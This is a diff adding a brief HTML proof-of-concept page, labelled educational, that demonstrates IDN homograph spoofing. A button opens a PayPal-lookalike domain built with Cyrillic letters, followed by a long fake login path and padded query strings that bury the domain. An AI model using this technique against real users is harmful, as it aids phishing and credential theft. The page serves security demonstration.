@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>IDN Homograph Long URL PoC</title>
+</head>
+<body>
+    <h2>IDN / Homograph Spoofing PoC (Educational)</h2>
+    <button onclick="openLongUrl()">Open Long URL</button>
+
+    <script>
+        function openLongUrl() {
+            /*
+              Domain menggunakan karakter Unicode:
+              "а" (Cyrillic U+0430) ≠ "a" (Latin)
+              "е" (Cyrillic U+0435) ≠ "e"
+            */
+
+            const idnDomain = "https://www.pаypаl.com"; 
+            // Perhatikan: beberapa huruf 'a' di atas adalah Cyrillic
+
+            // Path & query sangat panjang
+            const longPath = "/login/secure/session/verify/account/update/confirm/index.html";
+
+            const longQuery = "?session=" + "A".repeat(300) +
+                "&token=" + "B".repeat(300) +
+                "&redirect=https://www.google.com/search?q=" + "C".repeat(300);
+
+            const finalUrl = idnDomain + longPath + longQuery;
+
+            window.open(finalUrl, "_blank");
+        }
+    </script>
+</body>
+</html>
